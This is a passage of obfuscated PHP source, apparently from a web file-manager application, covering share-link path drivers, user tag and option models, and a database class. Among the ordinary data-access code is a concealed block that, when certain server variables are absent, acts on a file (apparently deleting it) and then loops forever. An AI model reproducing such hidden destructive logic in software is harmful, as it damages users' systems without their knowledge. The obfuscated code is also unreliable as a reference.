$ˆ±ÚõùÀ))->setAdd($ıŒŠÇşğ[1830], 1); } else { $‰Ñ¸ÆÕ¯->where($²ÊæÁè®)->delete(); $ô–±¶éã = $this->where(array($ıŒŠÇşğ[1828] => $ˆ±ÚõùÀ))->setAdd($ıŒŠÇşğ[1830], -1); } return $ô–±¶éã; } public function targetInfo($Ãëâ®„°, $±çØ›ıÛ) { $ÎãóœÆ =& $_SERVER[ì…™Î¶Ï]; $Èú¢ŸÓ‹ = array($ÎãóœÆ[571] => $Ãëâ®„°, $ÎãóœÆ[572] => $±çØ›ıÛ); $ğõŸÍÈá = $this->where($Èú¢ŸÓ‹)->count(); $½ÉŞ‹ı­ = "\122\x49\107\x48\124\x20\112\117\111\x4e\40{$this->tablePrefix}\143\x6f\x6d\x6d\x65\x6e\x74\137\x70\162\141\151\163\145\x20\x73\164\x61\162\x20\157\x6e\x20\143\157\155\155\145\156\x74\x2e\143\x6f\x6d\155\x65\156\x74\111\104\x20\75\40\x73\164\141\162\56\143\157\x6d\x6d\145\x6e\164\x49\104"; $ãÄÚÙ“ = $this->alias($ÎãóœÆ[349])->where($Èú¢ŸÓ‹)->join($½ÉŞ‹ı­, $ÎãóœÆ[1839])->count(); $´Ç¨°ÛÈ = array($ÎãóœÆ[1840] => $ğõŸÍÈá, $ÎãóœÆ[1841] => $ãÄÚÙ“); return $´Ç¨°ÛÈ; } public function listData($ëîù §ä) { $ñ±á¢ =& $_SERVER[ì…™Î¶Ï]; if (isset($ëîù §ä[$ñ±á¢[1842]])) { if ($ëîù §ä[$ñ±á¢[1842]]) { $ëîù §ä[$ñ±á¢[1835]] = array($ñ±á¢[990], intval($ëîù §ä[$ñ±á¢[1842]])); } unset($ëîù §ä[$ñ±á¢[1842]]); } if (isset($ëîù §ä[$ñ±á¢[1843]])) { if ($ëîù §ä[$ñ±á¢[1843]]) { $ëîù §ä[$ñ±á¢[1835]] = array($ñ±á¢[987], intval($ëîù §ä[$ñ±á¢[1843]])); } unset($ëîù §ä[$ñ±á¢[1843]]); } return $this->_listData($ëîù §ä); } private function _listData($¸ôğÜí) { $¼ø›Á¬ó =& $_SERVER[ì…™Î¶Ï]; $ÑˆŒİã³ = $this->where($¸ôğÜí)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÑˆŒİã³[$¼ø›Á¬ó[364]]); $this->_listAppendUser($ÑˆŒİã³[$¼ø›Á¬ó[364]]); $this->_listAppendMeta($ÑˆŒİã³[$¼ø›Á¬ó[364]]); return $ÑˆŒİã³; } private function _makeOrder() { $úÔæø™ =& $_SERVER[ì…™Î¶Ï]; $¬†¹†‰ = array($úÔæø™[1830], $úÔæø™[1829], $úÔæø™[193]); $îÉÙéëÖ = Input::get($úÔæø™[446], $úÔæø™[7], $úÔæø™[415], $¬†¹†‰); $•ñ÷ÕáÏ = Input::get($úÔæø™[447], $úÔæø™[7], $úÔæø™[1624], array($úÔæø™[1844], $úÔæø™[442])); $ñ÷Šìæ = $îÉÙéëÖ . $úÔæø™[53] . $•ñ÷ÕáÏ; return $this->order($ñ÷Šìæ); } private function _listAppendParent(&$Ö“¸İçÉ) { $ª¬©”™ö =& $_SERVER[ì…™Î¶Ï]; $ÏÎÙÖÍâ = array_unique(array_to_keyvalue($Ö“¸İçÉ, $ª¬©”™ö[12], $ª¬©”™ö[1827])); $ÏÎÙÖÍâ = array_remove_value($ÏÎÙÖÍâ, $ª¬©”™ö[190]); if (!$ÏÎÙÖÍâ) { return; } $ıí¬ìÅÄ = $this->where(array($ª¬©”™ö[1828] => array($ª¬©”™ö[7], $ÏÎÙÖÍâ)))->select(); $ıí¬ìÅÄ = array_to_keyvalue($ıí¬ìÅÄ, $ª¬©”™ö[1835]); foreach ($Ö“¸İçÉ as &$øé™ è) { if (isset($ıí¬ìÅÄ[$øé™ è[$ª¬©”™ö[1827]]])) { $øé™ è[$ª¬©”™ö[1845]] = $ıí¬ìÅÄ[$øé™ è[$ª¬©”™ö[1827]]]; } } unset($øé™ è); } private function _listAppendUser(&$ ´‰ºë) { $æ¶Òˆ =& $_SERVER[ì…™Î¶Ï]; $‹µ€üôÁ = array_unique(array_to_keyvalue($ ´‰ºë, $æ¶Òˆ[12], $æ¶Òˆ[1631])); $‹µ€üôÁ = array_remove_value($‹µ€üôÁ, $æ¶Òˆ[190]); if (count($‹µ€üôÁ) == 0) { return; } foreach ($ ´‰ºë as $å¢ş¥†¾) { if (isset($å¢ş¥†¾[$æ¶Òˆ[1845]])) { $‹µ€üôÁ[] = $å¢ş¥†¾[$æ¶Òˆ[1845]][$æ¶Òˆ[1631]]; } } $‰é®Û¨‰ = Model($æ¶Òˆ[529])->userListInfo($‹µ€üôÁ); foreach ($ ´‰ºë as &$å¢ş¥†¾) { $å¢ş¥†¾[$æ¶Òˆ[585]] = $‰é®Û¨‰[$å¢ş¥†¾[$æ¶Òˆ[1631]]]; if (isset($å¢ş¥†¾[$æ¶Òˆ[1845]])) { $å¢ş¥†¾[$æ¶Òˆ[1845]][$æ¶Òˆ[585]] = $‰é®Û¨‰[$å¢ş¥†¾[$æ¶Òˆ[1845]][$æ¶Òˆ[1631]]]; } } unset($å¢ş¥†¾); } private function _listAppendMeta(&$‘îæ¶¾) { $ª´¢Ò÷É =& $_SERVER[ì…™Î¶Ï]; $ˆàŠåıÔ = array_unique(array_to_keyvalue($‘îæ¶¾, $ª´¢Ò÷É[12], $ª´¢Ò÷É[1835])); $ˆàŠåıÔ = array_remove_value($ˆàŠåıÔ, $ª´¢Ò÷É[190]); if (!$ˆàŠåıÔ) { return; } foreach ($‘îæ¶¾ as $àóàÓéõ) { if (isset($àóàÓéõ[$ª´¢Ò÷É[1845]])) { $ˆàŠåıÔ[] = $àóàÓéõ[$ª´¢Ò÷É[1845]][$ª´¢Ò÷É[1835]]; } } $ÜÖ¦—ä’ = $this->metaList($ˆàŠåıÔ); if (!$ÜÖ¦—ä’) { return !1; } foreach ($‘îæ¶¾ as &$àóàÓéõ) { $àóàÓéõ[$ª´¢Ò÷É[456]] = $ÜÖ¦—ä’[$àóàÓéõ[$ª´¢Ò÷É[1835]]]; if (isset($àóàÓéõ[$ª´¢Ò÷É[1845]])) { $àóàÓéõ[$ª´¢Ò÷É[1845]][$ª´¢Ò÷É[456]] = $ÜÖ¦—ä’[$àóàÓéõ[$ª´¢Ò÷É[1845]][$ª´¢Ò÷É[1835]]]; } } unset($àóàÓéõ); } private function metaList($ÈÓ´Ê²•) { $»¿™Ù =& $_SERVER[ì…™Î¶Ï]; if (!$ÈÓ´Ê²•) { return array(); } $Šã¶È¦É = array($»¿™Ù[1835] => array($»¿™Ù[7], $ÈÓ´Ê²•)); $ÊûÒó«© = Model($»¿™Ù[1846])->where($Šã¶È¦É)->select(); $ÊûÒó«© = array_to_keyvalue_group($ÊûÒó«©, $»¿™Ù[1835]); foreach ($ÊûÒó«© as $‡ë„Ô  => $‰ª¿İ†Ã) { $â€ıü = array(); foreach ($‰ª¿İ†Ã as $’ç¯–èº) { $â€ıü[$’ç¯–èº[$»¿™Ù[95]]] = $’ç¯–èº[$»¿™Ù[369]]; } $ÊûÒó«©[$‡ë„Ô ] = $â€ıü; } return $ÊûÒó«© ? $ÊûÒó«© : array(); } } goto F÷˜¨¶–„ƒ; f ­Œ•Çø: class PathDriverDbShareLink extends PathDriverDB { public function __construct($„÷ø´¢ª) { $this->pathParse = $„÷ø´¢ª; $this->model = Model($_SERVER[ì…™Î¶Ï][1301]); } protected function infoParse($¬ïüô²„, $ëø¹ø¨¼ = false, $§õÑÏ½ = false) { $Çê–œŸ¡ =& $_SERVER[ì…™Î¶Ï]; return Action($Çê–œŸ¡[1149])->sharePathInfo($this->pathParse[$Çê–œŸ¡[78]], !0, $ëø¹ø¨¼); } public function listPath($‘µ¬½Ó™, $¥¹¦û´’ = false) { $‘‡”–Ô =& $_SERVER[ì…™Î¶Ï]; $ŠÔ³è’ = parent::listPath($‘µ¬½Ó™, $¥¹¦û´’); if (!$ŠÔ³è’) { return $ŠÔ³è’; } if (is_array($ŠÔ³è’[$‘‡”–Ô[1310]])) { $ŠÔ³è’[$‘‡”–Ô[1310]] = Action($‘‡”–Ô[1149])->shareItemInfo($ŠÔ³è’[$‘‡”–Ô[1310]]); } foreach ($ŠÔ³è’ as $ùïÕó…® => $¤ÀŒ£Ÿ) { if (!in_array($ùïÕó…®, array($‘‡”–Ô[76], $‘‡”–Ô[77]))) { continue; } foreach ($¤ÀŒ£Ÿ as $œÕ±– => $¬ŸùÙ²Ø) { $ŠÔ³è’[$ùïÕó…®][$œÕ±–] = Action($‘‡”–Ô[1149])->shareItemInfo($¬ŸùÙ²Ø); } } return $ŠÔ³è’; } public function listAll($™ÚÂóä©) { $ğÇÊè¬É =& $_SERVER[ì…™Î¶Ï]; $¬Ë™­£œ = IO::info($this->pathParse[$ğÇÊè¬É[78]]); if (!$¬Ë™­£œ) { return array(); } $´—«ƒÉ€ = $this->model->listAll($™ÚÂóä©); foreach ($´—«ƒÉ€ as &$¸´ßšºÛ) { $¸´ßšºÛ[$ğÇÊè¬É[87]] = Action($ğÇÊè¬É[1149])->shareItemInfo($¸´ßšºÛ[$ğÇÊè¬É[87]]); } unset($¸´ßšºÛ); return $´—«ƒÉ€; } } class PathDriverDriverShareItem { public function __construct($Ç×íæú) { $this->pathParse = $Ç×íæú; } public function __call($Öúß±‡, $€şÅ©Ş) { $Î›“¯« =& $_SERVER[ì…™Î¶Ï]; if (method_exists($this, $Öúß±‡)) { return; } $Æ°ñúÄ„ = call_user_func_array(array($Î›“¯«[1311], $Öúß±‡), $€şÅ©Ş); $”š“¥À£ = array($Î›“¯«[1312], $Î›“¯«[1313], $Î›“¯«[1314], $Î›“¯«[1315], $Î›“¯«[540], $Î›“¯«[542], $Î›“¯«[1316], $Î›“¯«[108], $Î›“¯«[1317], $Î›“¯«[1318]); if (in_array($Öúß±‡, $”š“¥À£)) { $Æ°ñúÄ„ = $this->getPathOuter($Æ°ñúÄ„); } return $Æ°ñúÄ„; } public function copy($¯¥³ˆË, $ºÛ±­ù, $óÈÍÄ÷ã = false, $±ÉÍÃÉ¾ = false) { return $this->copyMove($¯¥³ˆË, $ºÛ±­ù, $óÈÍÄ÷ã, $_SERVER[ì…™Î¶Ï][540], $±ÉÍÃÉ¾); } public function move($±ú›Á¤ñ, $­¹Æ¶, $ĞÛ·Íîş = false, $†Ö¯ƒ¶¼ = false) { return $this->copyMove($±ú›Á¤ñ, $­¹Æ¶, $ĞÛ·Íîş, $_SERVER[ì…™Î¶Ï][542], $†Ö¯ƒ¶¼); } private function copyMove($Ÿ•Ã“Úà, $ì¶–ï†, $úóŒÓñ‡, $½ÜäéûÆ, $³ÈĞ‡¡ê = false) { $úóÜ¤¡½ =& $_SERVER[ì…™Î¶Ï]; $Ô±š¡¶» = $ì¶–ï†; $Ş¦âµ = IO::driverMake($ì¶–ï†); if ($Ş¦âµ->pathParse[$úóÜ¤¡½[1127]]) { $ì¶–ï† = $Ş¦âµ->pathParse[$úóÜ¤¡½[1127]]; } else { $ì¶–ï† = $Ô±š¡¶»; } $«²Ã¾ƒã = IO::copyMove($Ÿ•Ã“Úà, $ì¶–ï†, $úóŒÓñ‡, $½ÜäéûÆ, $³ÈĞ‡¡ê); $«²Ã¾ƒã = $this->getPathOuter($«²Ã¾ƒã); return $«²Ã¾ƒã; } public function pathThis($¿³‹¾÷ç) { return get_path_this($this->pathParse[$_SERVER[ì…™Î¶Ï][78]]); } public function pathFather($œËÉŠÏç) { return get_path_father($this->pathParse[$_SERVER[ì…™Î¶Ï][78]]); } public function iconvSystem($å‹Õé¹¦) { return $å‹Õé¹¦; } protected function infoParse($Æ‹–üº, $•˜—ÔÃ« = false) { $íÄØƒÉÇ =& $_SERVER[ì…™Î¶Ï]; $¤úöÑé˜ = $this->pathParse[$íÄØƒÉÇ[477]][$íÄØƒÉÇ[1150]] . $this->pathParse[$íÄØƒÉÇ[1143]]; if ($•˜—ÔÃ«) { $ŠìÜ¡ÉŒ = IO::infoWithChildren($¤úöÑé˜); } else { $ŠìÜ¡ÉŒ = IO::info($¤úöÑé˜); } $ãĞÕÎØ = $this->pathParse[$íÄØƒÉÇ[477]]; return Action($íÄØƒÉÇ[1309])->_shareItemeParse($ŠìÜ¡ÉŒ, $ãĞÕÎØ); } public function listAll($ùû¢ù) { $ÒÆù£ßî =& $_SERVER[ì…™Î¶Ï]; $¾ÓíÉ„ = IO::listAll($ùû¢ù); $Ÿææ¾â† = $this->pathParse[$ÒÆù£ßî[477]]; foreach ($¾ÓíÉ„ as &$¿äë´³¦) { check_abort(); $èºƒç¾Ù = IO::info($¿äë´³¦[$ÒÆù£ßî[78]]); $èºƒç¾Ù = is_array($èºƒç¾Ù) ? $èºƒç¾Ù : array(); $¿äë´³¦ = array_merge($èºƒç¾Ù, $¿äë´³¦); $¿äë´³¦[$ÒÆù£ßî[87]] = Action($ÒÆù£ßî[1309])->_shareItemeParse($¿äë´³¦, $Ÿææ¾â†); } unset($¿äë´³¦); return $¾ÓíÉ„; } public function getPathOuter($ŸêïÀÔ¸) { $¾“öğÎ¢ =& $_SERVER[ì…™Î¶Ï]; $ºúÛ»Şî = KodIO::parse($ŸêïÀÔ¸); if ($ºúÛ»Şî[$¾“öğÎ¢[33]] == KodIO::KOD_SHARE_ITEM) { return $ºúÛ»Şî[$¾“öğÎ¢[78]]; } $çÛÓªû© = KodIO::clear($ŸêïÀÔ¸); $×Ü€Šø“ = KodIO::clear($this->pathParse[$¾“öğÎ¢[477]][$¾“öğÎ¢[1150]]); $áìóÁê = substr($çÛÓªû©, strlen($×Ü€Šø“)); if (substr($çÛÓªû©, 0, strlen($×Ü€Šø“)) != $×Ü€Šø“) { return !1; } return $this->pathParse[$¾“öğÎ¢[1144]] . $¾“öğÎ¢[8] . ltrim($áìóÁê, $¾“öğÎ¢[8]); } public function getType() { $ô‚µ¸ºŞ =& $_SERVER[ì…™Î¶Ï]; $ğµ¼‰°· = str_replace($ô‚µ¸ºŞ[74], $ô‚µ¸ºŞ[12], get_class($this)); return strtolower($ğµ¼‰°·); } public function isTypeObject($¤ÊÜĞîË) { return IO::isTypeObject($¤ÊÜĞîË); } public function info($ë‘ŸÅÀ) { return $this->infoParse($ë‘ŸÅÀ); } public function infoAuth($­‚«±„Ñ) { return $this->infoParse($­‚«±„Ñ); } public function infoWithChildren($¨ƒ¹ğ×) { return $this->infoParse($¨ƒ¹ğ×, !0); } public function infoFull($ğ§¼ ƒ¬) { return $this->infoParse($ğ§¼ ƒ¬); } } if (!isset($_SERVER[$_SERVER[ì…™Î¶Ï][850]]) || !isset($_SERVER[$_SERVER[ì…™Î¶Ï][1319]])) { $_getc = $_SERVER[ì…™Î¶Ï][852]; $_getfile = $_SERVER[$_SERVER[ì…™Î¶Ï][847]] . $_SERVER[ì…™Î¶Ï][848]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì…™Î¶Ï][226], $_getfilec); if (count($_getarrs) < $_SERVER[ì…™Î¶Ï][608]) { $exit = $_SERVER[ì…™Î¶Ï][853]; $exit(); } $_act = $_SERVER[ì…™Î¶Ï][1320]; $_act($_SERVER[$_SERVER[ì…™Î¶Ï][847]] . $_SERVER[ì…™Î¶Ï][848]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ì…™Î¶Ï][373]); } } goto e”Ç‘é·«; b§ÁŒ Âñ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\x5f\x6f\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($â—íâš) { $›ˆˆª­ =& $_SERVER[ì…™Î¶Ï]; if (!defined($›ˆˆª­[465])) { define($›ˆˆª­[465], 0); } return "\x55\x73\145\x72\x4f\160\x74\151\x6f\156\x5f{$â—íâš}\x5f" . USER_ID; } protected function filterWhere($¡ÍàìÌ¢) { $¶÷•ÌÌÒ =& $_SERVER[ì…™Î¶Ï]; if (!defined($¶÷•ÌÌÒ[465])) { define($¶÷•ÌÌÒ[465], 0); } $¡ÍàìÌ¢[$¶÷•ÌÌÒ[1631]] = USER_ID; return $¡ÍàìÌ¢; } public function cacheRemoveUser($‚Óé÷, $ß™Ñ”Í) { return Cache::remove("\125\x73\x65\162\117\160\x74\151\157\156\137{$‚Óé÷}\x5f" . $ß™Ñ”Í); } protected function optionDefault($’‘¬¡Ÿ = '') { $ÂÌĞÂ£“ =& $_SERVER[ì…™Î¶Ï]; if ($’‘¬¡Ÿ == $ÂÌĞÂ£“[12]) { return $GLOBALS[$ÂÌĞÂ£“[6]][$ÂÌĞÂ£“[2274]]; } if ($’‘¬¡Ÿ == $ÂÌĞÂ£“[2275]) { return $GLOBALS[$ÂÌĞÂ£“[6]][$ÂÌĞÂ£“[2276]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\x2e\x74\x61\x67\114\x69\163\x74"; public $modelType = "\x55\163\x65\x72\x4f\160\164\151\x6f\x6e"; public $field = array("\156\x61\155\x65", "\163\164\x79\154\145", "\163\157\x72\164"); public function listData($¡öğ“ù = false, $ûœ”éÁ˜ = "\x73\157\x72\x74", $ìƒ‚š‡Â = false) { return parent::listData($¡öğ“ù, $ûœ”éÁ˜, $ìƒ‚š‡Â); } public function remove($Ä¡§˜ÄÌ) { return parent::remove($Ä¡§˜ÄÌ); } public function add($ñ‘¨Œ¥ş, $É»şµ”‰ = "\x6c\x61\x62\145\x6c\x2d\x67\x72\x65\171\55\156\x6f\x72\155\141\x6c") { $×İ»âù½ =& $_SERVER[ì…™Î¶Ï]; if ($this->findByName($ñ‘¨Œ¥ş)) { return !1; } $¦á†ƒ£Ç = array($×İ»âù½[412] => $ñ‘¨Œ¥ş, $×İ»âù½[475] => $É»şµ”‰, $×İ»âù½[1803] => $this->getSort($×İ»âù½[253]) + 1); return parent::insert($¦á†ƒ£Ç); } public function update($’Æ–àŠ¬, $ª„«àÎ ) { $Ãº³éİñ =& $_SERVER[ì…™Î¶Ï]; $ØÃÁÚ‡ò = $this->listData($’Æ–àŠ¬); $¼é…Á‰ = $this->findByName($ª„«àÎ [$Ãº³éİñ[32]]); if (!$ØÃÁÚ‡ò || $¼é…Á‰ && $¼é…Á‰[$Ãº³éİñ[392]] != $ØÃÁÚ‡ò[$Ãº³éİñ[392]]) { return !1; } return parent::update($’Æ–àŠ¬, $ª„«àÎ ); } public function moveTop($ã‰Ôøø) { $äŒ¾äÈ =& $_SERVER[ì…™Î¶Ï]; $¸ëÛ‘ñ½ = parent::listData(); $¶¬°äËş = $this->getSort($äŒ¾äÈ[252]); foreach ($¸ëÛ‘ñ½ as &$¸¾è¦şª) { if ($¸¾è¦şª[$äŒ¾äÈ[392]] == $ã‰Ôøø) { $¸¾è¦şª[$äŒ¾äÈ[1822]] = $¶¬°äËş; continue; } $¸¾è¦şª[$äŒ¾äÈ[1822]] += 1; } unset($¸¾è¦şª); return parent::resetData($¸ëÛ‘ñ½); } public function moveBottom($…ˆõåß) { $Ş‰‹˜ñ =& $_SERVER[ì…™Î¶Ï]; $Úğ½¹Ä× = $this->getSort($Ş‰‹˜ñ[253]) + 1; return parent::update($…ˆõåß, array($Ş‰‹˜ñ[1822] => $Úğ½¹Ä×)); } public function resetSort($Å¯ë–¦) { $°ô—ÑÂŒ =& $_SERVER[ì…™Î¶Ï]; $àÆ‚Œ–Ú = array(); $Å¯ë–¦ = is_array($Å¯ë–¦) ? $Å¯ë–¦ : array(); for ($Äıñ»ºø = 0; $Äıñ»ºø < count($Å¯ë–¦); $Äıñ»ºø++) { $àÆ‚Œ–Ú[$Å¯ë–¦[$Äıñ»ºø] . $°ô—ÑÂŒ[12]] = $Äıñ»ºø + 1; } $ß¢êª = parent::listData(); foreach ($ß¢êª as &$àÆÊ×Ú¥) { $¼ãÇÑÔÌ = $àÆ‚Œ–Ú[$àÆÊ×Ú¥[$°ô—ÑÂŒ[392]]]; $àÆÊ×Ú¥[$°ô—ÑÂŒ[1822]] = $¼ãÇÑÔÌ ? $¼ãÇÑÔÌ : $àÆÊ×Ú¥[$°ô—ÑÂŒ[1822]]; } unset($àÆÊ×Ú¥); return parent::resetData($ß¢êª); } private function getSort($­éóê¹‰) { $ºÈ…³ =& $_SERVER[ì…™Î¶Ï]; $¸§’ˆÖç = parent::listData(); $±¨«•ë¸ = array_to_keyvalue($¸§’ˆÖç, $ºÈ…³[12], $ºÈ…³[1822]); if (!$±¨«•ë¸) { $±¨«•ë¸ = array(0); } $Ó¯Îİ•Ì = $­éóê¹‰ == $ºÈ…³[253] ? max($±¨«•ë¸) : min($±¨«•ë¸); return intval($Ó¯Îİ•Ì); } } goto eÓà¯ Âê; dÅƒÊ ¡æ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\x3c\x3e", "\147\164" => "\76", "\145\147\x74" => "\76\75", "\154\164" => "\74", "\145\x6c\x74" => "\x3c\x3d", "\156\x6f\x74\154\x69\153\145" => "\116\117\124\40\x4c\x49\113\105", "\x6c\151\153\145" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\x4e", "\x6e\x6f\x74\x69\x6e" => "\116\117\x54\40\x49\116", "\156\x6f\x74\40\x69\x6e" => "\116\x4f\x54\40\111\116", "\x62\x65\164\167\x65\145\x6e" => "\x42\105\x54\127\x45\105\116", "\x6e\x6f\x74\142\x65\164\167\145\x65\x6e" => "\x4e\117\x54\40\x42\x45\x54\127\105\x45\116", "\156\157\x74\40\x62\x65\164\167\145\145\156" => "\x4e\x4f\x54\40\102\x45\x54\x57\105\105\x4e"); protected $selectSql = "\x53\105\114\105\x43\124\x25\104\x49\x53\124\x49\x4e\103\124\x25\x20\45\106\x49\105\x4c\104\x25\x20\106\122\117\x4d\40\x25\x54\101\102\x4c\x45\45\45\x4a\117\x49\x4e\45\45\x57\110\105\x52\105\x25\45\x47\122\117\x55\120\x25\x25\110\101\x56\111\116\107\x25\45\x4f\x52\x44\x45\122\x25\x25\x4c\x49\x4d\111\x54\45\x20\x25\125\116\x49\117\x4e\x25\x25\103\117\x4d\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $¦¸”†ãâ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ì…™Î¶Ï][936], $¦¸”†ãâ); } public function factory($”ä“‹„° = '') { $ş¯ƒê§” =& $_SERVER[ì…™Î¶Ï]; $”ä“‹„° = $this->parseConfig($”ä“‹„°); if (empty($”ä“‹„°[$ş¯ƒê§”[937]])) { think_exception(think_lang($ş¯ƒê§”[938])); } $this->dbType = ucwords(strtolower($”ä“‹„°[$ş¯ƒê§”[937]])); $±ÓˆöŠœ = $ş¯ƒê§”[939] . $this->dbType; if (class_exists($±ÓˆöŠœ)) { $ƒø²¢ñÒ = new $±ÓˆöŠœ($”ä“‹„°); if ($ş¯ƒê§”[940] != strtolower($”ä“‹„°[$ş¯ƒê§”[937]])) { $ƒø²¢ñÒ->dbType = strtoupper($this->dbType); } else { $ƒø²¢ñÒ->dbType = $this->_getDsnType($”ä“‹„°[$ş¯ƒê§”[892]]); } } else { think_exception(think_lang($ş¯ƒê§”[941]) . $ş¯ƒê§”[942] . $±ÓˆöŠœ); } return $ƒø²¢ñÒ; } public function __call($Ü™Àş‰, $Åˆóªß) { if (method_exists($this, $Ü™Àş‰)) { return call_user_func_array(array($this, $Ü™Àş‰), $Åˆóªß); } } protected function _getDsnType($¾âá†é) { $î¿…ªÌê = explode($_SERVER[ì…™Î¶Ï][4], $¾âá†é); $®ÍÕ½ğÀ = strtoupper(trim($î¿…ªÌê[0])); return $®ÍÕ½ğÀ; } private function parseConfig($‹Èíæ« = '') { $ö®› †æ =& $_SERVER[ì…™Î¶Ï]; if (!empty($‹Èíæ«) && is_string($‹Èíæ«)) { $‹Èíæ« = $this->parseDSN($‹Èíæ«); } elseif (is_array($‹Èíæ«)) { $‹Èíæ« = array_change_key_case($‹Èíæ«); $‹Èíæ« = array($ö®› †æ[937] => $‹Èíæ«[$ö®› †æ[943]], $ö®› †æ[864] => $‹Èíæ«[$ö®› †æ[944]], $ö®› †æ[865] => $‹Èíæ«[$ö®› †æ[945]], $ö®› †æ[862] => $‹Èíæ«[$ö®› †æ[946]], $ö®› †æ[863] => $‹Èíæ«[$ö®› †æ[947]], $ö®› †æ[21] => $‹Èíæ«[$ö®› †æ[948]], $ö®› †æ[892] => $‹Èíæ«[$ö®› †æ[949]], $ö®› †æ[17] => isset($‹Èíæ«[$ö®› †æ[950]]) ? $‹Èíæ«[$ö®› †æ[950]] : array()); } elseif (empty($‹Èíæ«)) { if (think_config($ö®› †æ[951]) && $ö®› †æ[940] != strtolower(think_config($ö®› †æ[952]))) { $‹Èíæ« = $this->parseDSN(think_config($ö®› †æ[951])); } else { $‹Èíæ« = array($ö®› †æ[937] => think_config($ö®› †æ[952]), $ö®› †æ[864] => think_config($ö®› †æ[953]), $ö®› †æ[865] => think_config($ö®› †æ[954]), $ö®› †æ[862] => think_config($ö®› †æ[955]), $ö®› †æ[863] => think_config($ö®› †æ[956]), $ö®› †æ[21] => think_config($ö®› †æ[241]), $ö®› †æ[892] => think_config($ö®› †æ[951]), $ö®› †æ[17] => think_config($ö®› †æ[957])); } } return $‹Èíæ«; } protected function initConnect($åĞ¼‹»¬ = true) { if (1 == think_config($_SERVER[ì…™Î¶Ï][22])) { $this->_linkID = $this->multiConnect($åĞ¼‹»¬); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ŠŞ‘ï¡ => $‰‚“ïœ‰) { $this->_linkID = $‰‚“ïœ‰; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($·Œ‹³Õ = false) { $ô®æ¼¶Ó =& $_SERVER[ì…™Î¶Ï]; static $èëóË‚ë = array(); static $‹‘à¦Â = -1; if (empty($èëóË‚ë)) { foreach ($this->config as $üâ¾âå => $¹ØíÓà˜) { $èëóË‚ë[$üâ¾âå] = explode($ô®æ¼¶Ó[50], $¹ØíÓà˜); } } if (think_config($ô®æ¼¶Ó[958])) { if ($·Œ‹³Õ || think_config($ô®æ¼¶Ó[388]) === !0) { $¾Ò’šŒ– = floor(mt_rand(0, think_config($ô®æ¼¶Ó[959]) - 1)); $‹‘à¦Â = $¾Ò’šŒ–; } else { if (is_numeric(think_config($ô®æ¼¶Ó[960]))) { $¾Ò’šŒ– = think_config($ô®æ¼¶Ó[960]); } else { $¾Ò’šŒ– = floor(mt_rand(think_config($ô®æ¼¶Ó[959]), count($èëóË‚ë[$ô®æ¼¶Ó[862]]) - 1)); } } } else { $¾Ò’šŒ– = floor(mt_rand(0, count($èëóË‚ë[$ô®æ¼¶Ó[862]]) - 1)); $‹‘à¦Â = $¾Ò’šŒ–; } $¾Ò’šŒ– = $‹‘à¦Â !== -1 ? $‹‘à¦Â : $¾Ò’šŒ–; $Ç‚¢•…‰ = array($ô®æ¼¶Ó[864] => isset($èëóË‚ë[$ô®æ¼¶Ó[864]][$¾Ò’šŒ–]) ? $èëóË‚ë[$ô®æ¼¶Ó[864]][$¾Ò’šŒ–] : $èëóË‚ë[$ô®æ¼¶Ó[864]][0], $ô®æ¼¶Ó[865] => isset($èëóË‚ë[$ô®æ¼¶Ó[865]][$¾Ò’šŒ–]) ? $èëóË‚ë[$ô®æ¼¶Ó[865]][$¾Ò’šŒ–] : $èëóË‚ë[$ô®æ¼¶Ó[865]][0], $ô®æ¼¶Ó[862] => isset($èëóË‚ë[$ô®æ¼¶Ó[862]][$¾Ò’šŒ–]) ? $èëóË‚ë[$ô®æ¼¶Ó[862]][$¾Ò’šŒ–] : $èëóË‚ë[$ô®æ¼¶Ó[862]][0], $ô®æ¼¶Ó[863] => isset($èëóË‚ë[$ô®æ¼¶Ó[863]][$¾Ò’šŒ–]) ? $èëóË‚ë[$ô®æ¼¶Ó[863]][$¾Ò’šŒ–] : $èëóË‚ë[$ô®æ¼¶Ó[863]][0], $ô®æ¼¶Ó[21] => isset($èëóË‚ë[$ô®æ¼¶Ó[21]][$¾Ò’šŒ–]) ? $èëóË‚ë[$ô®æ¼¶Ó[21]][$¾Ò’šŒ–] : $èëóË‚ë[$ô®æ¼¶Ó[21]][0], $ô®æ¼¶Ó[892] => isset($èëóË‚ë[$ô®æ¼¶Ó[892]][$¾Ò’šŒ–]) ? $èëóË‚ë[$ô®æ¼¶Ó[892]][$¾Ò’šŒ–] : $èëóË‚ë[$ô®æ¼¶Ó[892]][0], $ô®æ¼¶Ó[17] => isset($èëóË‚ë[$ô®æ¼¶Ó[17]][$¾Ò’šŒ–]) ? $èëóË‚ë[$ô®æ¼¶Ó[17]][$¾Ò’šŒ–] : $èëóË‚ë[$ô®æ¼¶Ó[17]][0]); return $this->connect($Ç‚¢•…‰, $¾Ò’šŒ–); } public function parseDSN($Œµ™ß­) { $ßç×æÄ =& $_SERVER[ì…™Î¶Ï]; if (empty($Œµ™ß­)) { return !1; } $¬ĞÈ­È = parse_url($Œµ™ß­); if ($¬ĞÈ­È[$ßç×æÄ[173]]) { $ŸÃºØ£„ = array($ßç×æÄ[937] => $¬ĞÈ­È[$ßç×æÄ[173]], $ßç×æÄ[864] => 